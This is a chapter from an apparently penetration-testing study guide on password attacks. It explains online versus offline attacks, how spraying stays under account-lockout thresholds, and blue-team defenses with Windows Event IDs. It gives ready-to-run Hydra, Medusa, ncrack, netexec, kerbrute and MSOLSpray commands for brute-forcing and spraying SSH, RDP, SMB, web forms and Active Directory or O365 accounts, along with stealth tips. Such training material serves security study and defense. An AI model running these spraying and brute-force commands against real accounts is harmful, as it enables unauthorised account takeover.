---
title: "8. Password Attacks"
order: 8
part: "Password & Hash Attacks"
description: "Attack types, why spraying beats lockout, defenses, Hydra and other online tools, AD spraying and wordlists."
---

Conceptual distinction: password attacks split into two categories, **online** (trying passwords against a live service, over the network, based on the service's response) and **offline** (cracking a compromised hash on your own machine, without touching the network, at unlimited speed). An online attack is *noisy, gets caught by lockout, and is slow* (network round trip plus service response time). An offline attack is *silent, has no lockout, and runs billions of guesses per second with a GPU*. If a hash has been obtained, offline is **always** preferred (for offline cracking see Section 10; for hash formats see Section 9).

## 8.1 Attack types and when to use them

| Type | Layer | Input | Definition | When to choose it |
| --- | --- | --- | --- | --- |
| **Online guessing/brute** | Online | user + password(s) | Try passwords against a live service (SSH/SMB/RDP/HTTP/FTP) | When there is no hash, for an initial foothold; few attempts, **high lockout risk** |
| **Dictionary (wordlist)** | Both | word list | Try a human-made word list in order | Human passwords; the most efficient **starting point** (most real passwords are in rockyou) |
| **Brute-force** | Mostly offline | character set + length | All combinations of the given character space | **Small** key space (short/numeric PIN); otherwise combinatorial explosion |
| **Hybrid** | Mostly offline | wordlist + rules/mask | Additions/changes to a dictionary word (word+?d?d, rule) | Real passwords (`Password1!`, `Summer2024`): root word + suffix/number/symbol |
| **Rule-based** | Offline | wordlist + .rule | Transform each word with rules (capitalize/reverse/leet) | When a wordlist alone is not enough; captures the human mutations of passwords |
| **Mask** | Offline | ?u?l?d?s pattern | Systematically try a known pattern (8 characters: `?u?l?l?l?l?d?d?s`) | When the password **policy/pattern** is known; much faster than brute |
| **Password spraying** | Online | 1 password x many users | Try a single common password against all users | **To get around account lockout** (most critical); large AD/O365 environment |
| **Credential stuffing** | Online | leaked user:pass pairs | Try breach pairs against another service | Password **reuse**; when a breach/combo list is available |
| **Offline cracking** | Offline | hash file + wordlist | Crack a captured hash offline | When a hash has been obtained (see Section 10); **always preferred over online** |

A sub-distinction, `dictionary` vs `brute-force` vs `hybrid` vs `mask`: these are really strategies that apply both online (Hydra `-P` is a wordlist) and offline (hashcat `-a 0` dictionary, `-a 3` mask, `-a 6/7` hybrid). On the online side you generally use a wordlist or spraying; on the offline side you use wordlist+rule and mask.

**Note:** "I have a hash, which attack?" -> **offline cracking** (no lockout, fastest). "Account lockout is active, there are 500 users, I need a foothold" -> **password spraying**. "There is a breach combo list, the same users may exist on another portal" -> **credential stuffing**. "Policy is 8 characters, 1 uppercase and 1 digit required" -> **mask attack** offline (narrows the key space).

## 8.2 Why spraying gets around account lockout (lockout math)

An account lockout policy keeps **a separate counter for each user account**: "X failed attempts / Y minute window -> lockout". The critical point: the counter increments **per account, not per password**.

- **Classic (wrong) approach, per-user brute:** if you throw 50 passwords at the single `jsmith` user, the threshold (e.g. 5) is exceeded -> `jsmith` is locked out. Noise, plus you tip off the account owner, plus you cannot proceed.
- **Spraying (correct) approach, horizontal per password:** if you try the single password `Autumn2024!` against **each** of 500 users, each account gets only **1** failed attempt -> no counter reaches the threshold, no lockout is triggered. Yet even a single password hits at a rate of 1-5% (people pick predictable passwords).

**Safe spray window math:** Learn the policy first (8.6). Suppose:

- Lockout threshold = 5 failed attempts
- Observation window / reset (counter reset) = 30 minutes

Safe strategy: make **threshold - 1** attempts (here at most 4, in practice 1) against each account, then wait for **observation window + buffer**. The safest is to try **1 password per round** and wait **reset window + a few minutes** between rounds:

```
Round 1:  Password1 to all users          (1 failure per account)
  ... wait for the reset window + buffer (e.g. 31+ min) ...
Round 2:  Autumn2024! to all users         (counter reset, 1 again)
  ... wait ...
Round 3:  Welcome1 to all users
```

This way no account reaches the threshold within the window. Note: lockout looks at the attempts that accumulate **within a single window**; if you throw a second password before the counter resets, the account reaches 2. If threshold=5, at most 3-4 passwords within the window can be considered "safe", but if the organization's lockout reset logic (on Windows, the difference between `ObservationWindow` and `Duration`) is not clearly known, **1 password per round** is the safest rule.

**Note:** What makes spraying safe is the **wait between attempts (the window)** and **1 attempt per account**, not the number of passwords. If threshold=infinity (no lockout), you can do normal online brute instead of spray, but noise/MFA are still an issue. Spraying is done not for speed but for **stealth and avoiding lockout**: keep the number of parallel jobs and the speed low.

## 8.3 Password defenses (Blue team)

| Defense | What it does | Which attack it stops |
| --- | --- | --- |
| **Account lockout** | Locks the account after N failed attempts | Kills online brute; spraying exists **to get around** this |
| **Smart lockout (Entra/O365)** | Location/fingerprint-based smart lockout, also catches horizontal attempts | Also curbs password spraying (in the cloud) |
| **Complexity + length** | Grows the key space (length > complexity) | Slows/makes impossible brute and mask attacks |
| **MFA / 2FA** | Password + second factor | Even a cracked password is not enough, but **legacy protocols** (IMAP/SMTP/POP, some VPNs) bypass MFA |
| **Password age / history** | Prevents reuse of an old password | Curbs credential stuffing/reuse |
| **Salt** | Adds a random value to each password | Kills the **rainbow table** (see Section 9); does not slow offline cracking but breaks precomputation |
| **Fine-grained password policy (AD PSO)** | Group/user-specific policy (ADAC / `New-ADFineGrainedPasswordPolicy`) | Strict policy for high-privilege accounts |
| **Tiered admin model** | Separates admin accounts into tiers (Tier 0/1/2); does not drop a DA onto a workstation | Limits the impact of PtH/lateral movement + spray |
| **Monitoring without lockout (alerting)** | Alerts the SOC instead of locking (without DoS risk) | Detects spraying (lockout is open to DoS) |

**Detection/Defense:** The signature of spraying is "**a single failed logon from the same source across many different accounts in a short window**". On Windows this appears as a flood of Event ID 4625 (An account failed to log on) with the pattern of different `Target User` + same `Source Network Address`. **Alerting** is preferred over lockout, because aggressive lockout (e.g. 3 attempts) lets an attacker deliberately send wrong passwords to lock out all accounts (DoS).

## 8.4 Online password guessing, Hydra (full syntax)

Hydra is a parallel, multi-protocol online cracker. You can give the protocol as a **URL scheme** (`ssh://`) or as the **final argument** (`... ssh`).

**Flags:**

| Flag | Meaning |
| --- | --- |
| `-l LOGIN` | Single username |
| `-L FILE` | Username list (file) |
| `-p PASS` | Single password |
| `-P FILE` | Password list (file) |
| `-C FILE` | `user:pass` pairs file (combo, for credential stuffing) |
| `-t N` | Number of parallel jobs (threads); lower it per service (default 16; 1-4 for SSH/RDP) |
| `-f` | **Stop** at the first valid finding (when a single login is enough) |
| `-F` | With `-M`, stop at the first finding across multiple targets |
| `-s PORT` | Non-standard port |
| `-S` | Use SSL/TLS |
| `-e nsr` | Extra attempts: `n`=empty password, `s`=password=username, `r`=reverse of username |
| `-o FILE` | Write result to file |
| `-V` / `-vV` | Show every attempt (debug) |
| `-M FILE` | Target list file |
| `-u` | Put the user loop on the outside (spray-like: password fixed, users rotate) |
| `-w N` | Response timeout (sec) |

**Service examples:**

```
# SSH, single user, rockyou; keep threads low (SSH is slow and hangs)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4

# FTP, user + password list
hydra -L users.txt -P pass.txt ftp://10.10.10.10 -t 4

# RDP, last argument format; RDP is very sensitive, keep -t 1
hydra -l administrator -P pass.txt rdp://10.10.10.10 -t 1

# SMB (Windows share/session)
hydra -L users.txt -P pass.txt smb://10.10.10.10

# Non-standard port + stop on first find
hydra -l root -P pass.txt -s 2222 ssh://10.10.10.10 -f

# HTTPS form (-S or https-post-form)
hydra -l admin -P rockyou.txt 10.10.10.10 -S https-get /admin
```

**HTTP GET Basic Auth** (browser credential box / server returns 401):

```
hydra -L users.txt -P pass.txt 10.10.10.10 http-get /admin
```

**HTTP POST form (the most asked, `F=`/`S=` mandatory):** Three colon-separated fields: `path:body:condition`.

```
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

- `^USER^` / `^PASS^` -> Hydra injects the user/password here.
- `F=<string>` -> **failure** string: if the response contains this string, the attempt is counted as FAILED.
- `S=<string>` -> **success** string: if the response contains this, it is SUCCESSFUL (e.g. `S=Location` for a 302 redirect, `S=Logout`).
- `C=/path` -> first get a CSRF token/cookie from a page.
- `H=Header: value` -> extra header (e.g. CSRF token).

```
# Catch success via a 302 redirect
hydra -L users.txt -P pass.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=302"
```

**Note:** In an HTTP form attack, if the `F=`/`S=` condition is **absent**, Hydra counts every response as "success" -> hundreds of false positives. Copy the `F=` string verbatim from an actual failed response. `^USER64^`/`^PASS64^` in place of `^USER^`/`^PASS^` sends base64. Take the form field names (username/user/email, password/pass) from the target's HTML, do not make them up.

## 8.5 Other online tools (Medusa / Patator / ncrack)

```
# Medusa, module-based, stable; -h host, -H hostfile, -M module
medusa -h 10.10.10.10 -u admin -P pass.txt -M ssh
medusa -H hosts.txt -U users.txt -P pass.txt -M smbnt -t 4 -f   # -f: ilk bulguda dur
medusa -h 10.10.10.10 -u admin -P pass.txt -M http -m DIR:/admin -m FORM:...

# Patator, very flexible; filter success by code (modular but complex syntax)
patator ssh_login host=10.10.10.10 user=admin password=FILE0 0=pass.txt \
  -x ignore:mesg='Authentication failed.'
patator http_fuzz url=http://10.10.10.10/login method=POST \
  body='user=admin&pass=FILE0' 0=pass.txt -x ignore:fgrep='Invalid'

# ncrack, optimized especially for RDP/SSH (Nmap team); -p port, --user/--pass
ncrack -u administrator -P pass.txt rdp://10.10.10.10
ncrack -p 22 --user root -P pass.txt 10.10.10.10
ncrack -iL targets.txt -p ssh,rdp -U users.txt -P pass.txt
```

**Decision guide (which tool):** General multi-protocol -> **Hydra**. Stability on RDP/SSH -> **ncrack**. SMB/service module quality -> **Medusa**. Odd/custom HTTP flow (CSRF, multi-step, conditional) -> **Patator**. Windows AD services (SMB/WinRM/LDAP/MSSQL) -> **netexec** (8.6) is more practical than these tools.

## 8.6 Password spraying in Active Directory

First **learn the password policy** (spray safety depends on it), then spray.

```
# 1) Learn the password policy (lockout threshold + window), MANDATORY before spraying
nxc smb 10.10.10.10 -u 'guest' -p '' --pass-pol
nxc smb 10.10.10.10 -u valid_user -p 'Pass123' --pass-pol
# (alternatif: Windows'tan 'net accounts /domain'; Linux'tan rpcclient 'getdompwinfo')

# 2) Gather the user list (see Chapter 13 enum); then spray:
# netexec SMB, one password x many users. Avoid lockout.
nxc smb 10.10.10.10 -u users.txt -p 'Autumn2024!' --continue-on-success
# --continue-on-success: CONTINUE after the first success (try them all)

# --no-bruteforce: match user and pass files LINE BY LINE (NOT cartesian)
#   -> credential stuffing / combo (user1:pass1, user2:pass2 ...)
nxc smb 10.10.10.10 -u users.txt -p passes.txt --no-bruteforce --continue-on-success

# Kerberos-based spray (kerbrute), quieter than SMB; uses AS-REQ pre-auth
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Autumn2024!'
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Autumn2024!' -o hits.txt

# From within Windows (DomainPasswordSpray), generates a user list from its own AD
powershell -ep bypass
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Spring2024!' -OutFile spray_results.txt
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passes.txt -Delay 30
# reads the threshold with 'net accounts' on its own and produces a safe user list

# Azure / Entra ID / O365 (bulut) - MSOLSpray
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password 'Winter2024!'
# in the output: valid?, MFA enabled?, account locked/disabled? (very valuable)
```

Protocol note: SMB spray increments the **lockout counter** on every failure (Event 4625/4740). Kerberos (kerbrute) tries via **AS-REQ pre-auth**; a failed pre-auth produces **Event 4771** and is logged differently in some environments, but it **still increments the lockout counter** (contrary to belief, Kerberos spray can also lock the account): the assumption "Kerberos does not count toward lockout" is wrong, so still mind the window.

Common spray passwords: `Season+Year!` (`Autumn2024!`, `Summer2024!`), `CompanyName1`, `CompanyName2024`, `Welcome1`, `Welcome2024!`, `Password1`, `Password123`, `Changeme123`. The month/season + year pattern hits most often (mandatory periodic password changes push people toward it).

**Note:** Without `--continue-on-success`, nxc stops at the first success (in a spray you want to see them all). `--no-bruteforce` **turns off the Cartesian product** (user-password row matching): you do not use it with a single password in a spray, you use it in combo/stuffing. MSOLSpray also reports the MFA state in the cloud; an account with MFA enabled means "valid password but you cannot get in" -> look for a legacy/non-MFA path.

## 8.7 Generating and improving wordlists

```
# Ready-made lists
/usr/share/wordlists/rockyou.txt            # classic, ~14M real passwords (first choice)
/usr/share/seclists/...                      # SecLists: Passwords/, Usernames/ zengin

# Harvest words from the target site (CeWL), corporate jargon/product names
cewl -d 2 -m 5 -w custom.txt http://target.com
# -d 2 depth, -m 5 min word length; --with-numbers adds number-appended variants
cewl -d 2 -m 5 --with-numbers -w custom.txt http://target.com

# Pattern/mask-based generation (crunch)
crunch 8 8 -t ,%%%%%% -o crunch.txt         # length 8, pattern of 1 uppercase + 6 digits
# crunch MIN MAX [charset] -t pattern: @=letter, ,=UPPERCASE letter, %=digit, ^=symbol

# Generate usernames from names (for AD enum)
username-anarchy -i names.txt               # John Smith -> jsmith, john.smith, j.smith ...
username-anarchy --input-file names.txt > users.txt

# Expand the wordlist with rules (hashcat --stdout; expansion before offline cracking)
hashcat --stdout rockyou.txt -r /usr/share/hashcat/rules/best64.rule > big.txt
hashcat --stdout rockyou.txt -r rules/d3ad0ne.rule -r rules/toggles1.rule > big.txt
# --stdout: doesn't crack, just prints rule-applied candidates (pipe to another tool)
```

Useful hashcat rule files: `best64.rule` (the most efficient small set), `rockyou-30000.rule`, `d3ad0ne.rule`, `dive.rule` (very aggressive), `OneRuleToRuleThemAll` (bulk, popular). Rules generate human mutations of `Password` such as `Password1`, `P@ssw0rd`, `Password!`, `PASSWORD`, `drowssaP`.

**Note:** CeWL generates **target-specific** words: in a corporate environment it is more accurate than rockyou (employee, product, slogan names). `--stdout` cracks nothing, it only produces candidates; for piping into an online tool (Hydra `-P -`) or into another hashcat.

## 8.8 Detection/Defense, Blue team Event ID map

| Event | Windows Event ID | Where | Attack signature |
| --- | --- | --- | --- |
| Failed logon | **4625** | Security log | Many different `Target User`, same `Source Address` -> spraying; single user many attempts -> brute |
| Account locked out | **4740** | Security log (DC/PDC) | Side effect of aggressive brute or spray; a sign of DoS |
| Successful logon | **4624** | Security log | First login after a spray hit (`Logon Type 3`=network) |
| Kerberos TGT requested | **4768** | DC Security log | AS-REP roasting / kerbrute enum/spray |
| Kerberos pre-auth failed | **4771** | DC Security log | Kerberos-based spray/brute (kerbrute), `Failure Code 0x18` wrong password |
| NTLM authentication | **4776** | DC Security log | NTLM brute/spray (old protocol) |
| Logon type field | Type 3 (network), 10 (RDP), 8 (NetworkCleartext=Basic auth) | inside 4624/4625 | Tells you which service is being targeted |

Defense summary: **alerted monitoring** instead of lockout (avoid DoS), **MFA** (close legacy protocols), **long password + banned-password list** (ban common spray passwords like `Welcome1`, `CompanyName1`), **Azure Smart Lockout**, a SIEM correlation rule for "4625 across M different accounts in N minutes".

## 8.9 Decision guide, common mistakes and field tips

**Decision guide:**

- Did you obtain a hash? -> **offline cracking** (Section 10). Do not go back to online.
- No hash, a single target service, no lockout? -> **online dictionary** (Hydra) with a narrow wordlist, low `-t`.
- No hash, broad AD/many users, lockout present? -> **password spraying** (nxc/kerbrute), `--pass-pol` first.
- Is there a breach combo list? -> **credential stuffing** (Hydra `-C`, nxc `--no-bruteforce`).
- Is the password pattern/policy known? -> **mask** offline, a narrow list matching the pattern online.
- A web login form? -> **Hydra http-post-form** + correct `F=`/`S=`.

**Common mistakes / field tips:**

- Leaving `-t` high in online brute -> the service hangs/locks, false negatives. Use `-t 1-4` for SSH/RDP.
- `rockyou.txt` may come compressed: unpack it with `gunzip /usr/share/wordlists/rockyou.txt.gz`.
- Making up field names in a Hydra form attack; first see the real form body with `curl`/a browser.
- Forgetting `--continue-on-success` in a spray, or throwing a second password before the counter resets (lockout!).
- Spraying an MFA service and thinking "the password is wrong": the password may be correct, MFA is blocking it (MSOLSpray reports the state).
- Spraying without validating the user list: invalid users make noise; first filter valid accounts with enum (Section 13).

**Common mistakes (summary):**

- When there is account lockout risk, choose **spraying** (1 password x many users), not per-user brute.
- Online guessing gets caught by lockout and is slow; if a hash has been obtained, **offline cracking** is always preferred.
- In a Hydra HTTP form, without a failure/success string (`F=`/`S=`) the result is unreliable.
- Spraying an MFA-enabled service generally does not work -> target single-factor/legacy services (SMB, IMAP/SMTP, some VPN/mail).
- What makes a spray safe is the **wait between attempts + 1 attempt per account**; learn the threshold first with `--pass-pol`.
- Kerberos-based spray can (contrary to belief) also increment the lockout counter: do not fall for the "Kerberos does not count toward lockout" trap.
